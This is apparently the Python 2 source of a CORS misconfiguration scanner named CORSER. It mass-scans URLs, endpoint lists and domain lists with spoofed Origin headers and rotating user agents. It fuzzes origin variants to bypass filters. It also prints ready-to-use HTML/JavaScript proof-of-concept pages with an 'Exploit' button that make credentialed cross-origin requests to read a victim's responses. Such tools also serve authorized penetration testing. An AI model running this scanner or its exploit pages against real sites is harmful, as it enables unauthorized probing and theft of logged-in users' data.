import sys
import argparse
import requests as rq
import Queue
import threading
import random

queueLock = threading.Lock()
workQueue = Queue.Queue()
headers_useragents=[]
exitFlag = 0
threads = []

class thread_processing(threading.Thread):
   def __init__(self, url, list_domain, list_endpoint, header, origin):
		threading.Thread.__init__(self)
		self.url = url
		self.list_domain = list_domain
		self.list_endpoint = list_endpoint	
		self.header = header
		self.origin = origin
   def run(self):
		if(self.url != None and self.list_domain == None):
			single_scanner(self.url, self.list_endpoint, self.header, self.origin)
		if(self.url == None and self.list_domain != None):
			mass_scanner(self.list_domain, self.header, self.origin)
		if(self.url == None and self.list_domain == None):
			print "You must set url or list_domain argument"
			exit()

#scanning for list domain: -list_domain option
def mass_scanner(list_domain, header, origin):
	while not exitFlag:
		queueLock.acquire()
		if not workQueue.empty():
			domain=workQueue.get()
			print ("\033[1;44m[+] Trying domain: %s\033[1;m") % domain
			common_template(header,origin,domain)
			queueLock.release()
		else:
			queueLock.release()

#scan single url: -u option
def single_scanner(url, list_endpoint, header, origin):
	if list_endpoint != None:
		while not exitFlag:
			queueLock.acquire()
			if not workQueue.empty():
				endpoint=workQueue.get()
				print ("\033[1;44m[+] Trying endpoint: %s\033[1;m") % endpoint
				if(header != None):
					headers = str_to_dict(header)
					headers['Origin'] = origin
					headers['User-Agent'] = random.choice(headers_useragents)
					try:
						html = rq.get(url+endpoint,headers=headers)
						if(html.status_code == 200):
							handle_response(html,origin)
						else:
							print "Status_code :: " + str(html.status_code)
					except rq.exceptions.RequestException as e:
						print url+endpoint+" --> "+"error!"
						print e
				else:
					headers = {
					'Origin':origin,
					'User-Agent':random.choice(headers_useragents)
					}
					try:
						html = rq.get(url+endpoint,headers=headers)
						if(html.status_code == 200):
							handle_response(html,origin)
						else:
							print "Status_code :: " + str(html.status_code)
					except rq.exceptions.RequestException as e:
						print url+endpoint+" --> "+"error!"
						print e
				#
				queueLock.release()
			else:
				queueLock.release()
	else:
		common_template(header,origin,url)

def common_template(header,origin,url):
	if(header != None):
		headers = str_to_dict(header)
		headers['Origin'] = origin
		headers['User-Agent'] = random.choice(headers_useragents)
		try:
			html = rq.get(url,headers=headers)
			handle_response(html,origin)
		except rq.exceptions.RequestException as e:
			print url+" --> "+"error !"
			print e
	else:
		headers = {
			'Origin':origin,
			'User-Agent':random.choice(headers_useragents)
		}
		try:
			html = rq.get(url,headers=headers)
			handle_response(html,origin)
		except rq.exceptions.RequestException as e:
			print url+" --> "+"error !"
			print e

# convert -header option from str to dict
def str_to_dict(s):
	dct = {}
	if(s == ""):
		return dct
	else:
		if("," in s):
			s = s.split(",")
			print s
			for i in range(0,len(s)):
				tmp = s[i].split(":")
				dct[tmp[0]] = tmp[1]
		else:
			tmp = s.split(":")
			dct[tmp[0]] = tmp[1]
	return dct

#Handling response header
def handle_response(response,origin):
	print "Status_code :: " + str(response.status_code)
	cors_detection(response.headers,origin,response.url)

#Detecting CORS misconfiguration
def cors_detection(response,origin,url):
	ACAO = 'Access-Control-Allow-Origin';
	ACAC = 'Access-Control-Allow-Credentials'
	if ((ACAO in response) and (ACAC in response) and (origin in response.get(ACAO))):
		print url + ' --> '+'\033[1;41mCORS is vulnerable\033[1;m'
		display_header(response)
		return
	if(ACAO in response):
		print url +' --> '+'\033[1;43mCORS is enable\033[1;m'
		display_header(response)
		return
	else:
		print url +" --> "+"\033[1;46mNo\033[1;m"

#Displaying response header for single scanner only
def display_header(header):
	print "\033[1;36m-------------------------------------------------------------------\033[1;m"
	for key, value in header.iteritems():
		print key[0].upper()+key[1:]+": "+header[key]
	print "\033[1;36m-------------------------------------------------------------------\033[1;m"

#random useragent
def useragent_list():
    global headers_useragents
    headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
    headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
    headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
    headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
    headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
    headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
    headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
    headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
    headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
    headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
    headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
    headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
    return(headers_useragents)

#gen PoC
def PoC(method):
	if method == 'GET':
		print """
<!DOCTYPE html>
<html>
<head>
<script>
	function cors() {
		var xhttp = new XMLHttpRequest();
		xhttp.onreadystatechange = function() {
			if (this.readyState == 4 && this.status == 200){
				document.getElementById("demo").innerHTML = alert(this.responseText);
			}
		};
		xhttp.open('GET', 'https://target.com/anything/?param1=value1&pram2=value2', true);
		<!-- xhttp.setRequestHeader('setsomething');-->
		xhttp.withCredentials = true;
		xhttp.send();
	}
</script>
</head>
<body>
<center>
<h2>CORS POC</h2>
<h3>Extract Information</h3>
<div id="demo">
<button type="button" onclick="cors()">Exploit</button>
</div>
</body>
</html> """
	else:
		print """
<!DOCTYPE html>
<html>
<head>
<script>
	function cors() {
		var xhttp = new XMLHttpRequest();
		var params = 'param1=value1&param2=value2';
		xhttp.onreadystatechange = function() {
			if (this.readyState == 4 && this.status == 200){
				document.getElementById("demo").innerHTML = alert(this.responseText);
			}
		};
		xhttp.open("POST", "https://target.com/anything", true);
		xhttp.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
		xhttp.withCredentials = true;
		xhttp.send(params);
	}
</script>
</head>
<body>
<center>
<h2>CORS POC</h2>
<h3>Extract Information</h3>
<div id="demo">
<button type="button" onclick="cors()">Exploit</button>
</div>
</body>
</html>"""

#trying to bypass origin if we encounter filter
def bypass_filter(url,origin,header):
	print url
	urls = url.split('/')[2]
	tmp = urls.split('.')
	prefix = []
	patterns = []
	if(len(tmp) == 2):
		prefix.append(urls+'.'+origin)
		prefix.append(tmp[0]+'-'+tmp[1]+'.'+origin)
		prefix.append(tmp[0]+'.'+origin+'.'+tmp[1])
		prefix.append(urls+'-dev.'+origin)
		prefix.append(tmp[0]+tmp[1]+'-dev.'+origin)
		
	if(len(tmp)==3):
		prefix.append(urls+'.'+origin)
		prefix.append(tmp[0]+'-'+tmp[1]+'-'+tmp[2]+'.'+origin)
		prefix.append(tmp[1]+'.'+tmp[2]+'.'+origin)
		prefix.append(tmp[1]+'.'+origin+'.'+tmp[2])
		prefix.append(urls+'-dev.'+origin)
		prefix.append(tmp[0]+'.'+origin+'.'+tmp[1])
		prefix.append(tmp[0]+tmp[1]+tmp[2]+'-dev.'+origin)
		
	for i in range(0,len(prefix)):
		patterns.append(prefix[i])
		for schema in ['http://','https://']:
			patterns.append(schema+prefix[i])
			patterns.append(schema+prefix[i]+'/')
	
	if(header != None):
		for i in range(0,len(patterns)):
			headers = str_to_dict(header)
			headers['Origin'] = patterns[i]
			headers['User-Agent'] = random.choice(headers_useragents)
			print ("\033[1;44m[+] Trying origin: %s\033[1;m") % patterns[i]
			try:
				html = rq.get(url,headers=headers)
				cors_detection(html.headers,patterns[i],patterns[i])
			except rq.exceptions.RequestException as e:
				print patterns[i]+" --> "+"error !"
				print e
	else:
		for i in range(0,len(patterns)):
			headers = {
				'Origin':patterns[i],
				'User-Agent':random.choice(headers_useragents)
			}
			print ("\033[1;44m[+] Trying origin: %s\033[1;m") % patterns[i]
			try:
				html = rq.get(url,headers=headers)
				cors_detection(html.headers,patterns[i],patterns[i])
			except rq.exceptions.RequestException as e:
				print patterns[i]+" --> "+"error !"
				print e

#main program
if __name__ == '__main__':
	print """\033[1;35m
  ____ ___  ____  ____  _____ ____  
 / ___/ _ \|  _ \/ ___|| ____|  _ \ 
| |  | | | | |_) \___ \|  _| | |_) |
| |__| |_| |  _ < ___) | |___|  _ <
 \____\___/|_| \_\____/|_____|_| \_\\	Author: --==dienpv==--
	\033[1;m"""
	useragent_list()
	parser = argparse.ArgumentParser()
	parser.add_argument('-u', help='URL target. Ex: http://target.com/.',metavar='')
	parser.add_argument('-list_domain', help='Path to your list domains. Ex: ~/Desktop/domain/listdomains.txt',metavar='')
	parser.add_argument('-list_endpoint', help='Path to your list endpoints. Ex: ~/Desktop/domain/listendpoints.txt',metavar='')
	parser.add_argument('-header', help='Custom request header if authentication is required.',type=str,metavar='')
	parser.add_argument('-origin', help='Add Origin field into request header.',metavar='')
	parser.add_argument('-t', help='Number of threads. Default: 5.', default=3, type=int, metavar='')
	parser.add_argument('-poc', help='Gen CORS PoC using GET or POST.', metavar='')
	parser.add_argument('-fuzz', help='Trying to bypass origin if we encounter filter. Default=False', default=False,type=bool,metavar='')
	args = parser.parse_args()
	if(len(sys.argv) <= 1):
		print parser.print_help()
	else:
		if(args.poc != None):
			PoC(args.poc)
			exit()
		if(args.origin == None):
			print "You must set: -origin option !"
			exit()
		if(args.u != None and args.fuzz == True):
			bypass_filter(args.u,args.origin,args.header)
			exit()
		if(args.list_endpoint != None and args.list_domain == None):
			if(args.u == None):
				print "url is not set !"
				exit()
			for i in range (0,args.t):
   				thread = thread_processing(args.u,args.list_domain,args.list_endpoint,args.header,args.origin)
   				thread.start()
   				threads.append(thread)
			try:
				le = open(args.list_endpoint,'r').read().splitlines()
				queueLock.acquire()
				for word in le:
					workQueue.put(word)
				queueLock.release()
			except:
				exitFlag = 1
				print "Open file: \""+ args.list_endpoint+"\" failed !"
		if(args.list_domain != None and args.list_endpoint == None):
			if(args.u != None):
				print "-u option can not set with -list_domain option"
				exit()
			for i in range (0,args.t):
   				thread = thread_processing(args.u,args.list_domain,args.list_endpoint,args.header,args.origin)
   				thread.start()
   				threads.append(thread)
			try:
				ld = open(args.list_domain,'r').read().splitlines()
				queueLock.acquire()
				for word in ld:
					workQueue.put(word)
				queueLock.release()
			except:
				exitFlag = 1
				print "Open file: \""+ args.list_domain+"\" failed !"
		if(args.u != None and args.list_domain == None and args.list_endpoint == None):
			thread = thread_processing(args.u,args.list_domain,args.list_endpoint,args.header,args.origin)
   			thread.start()
   			threads.append(thread)
		# Wait for queue to empty
		while not workQueue.empty():
   			pass
		# Notify threads to exit
		exitFlag = 1
		# Wait for all threads to complete
		for t in threads:
   			t.join()
		print "\033[1;42m-----===EXIT===-----\033[1;m"
		
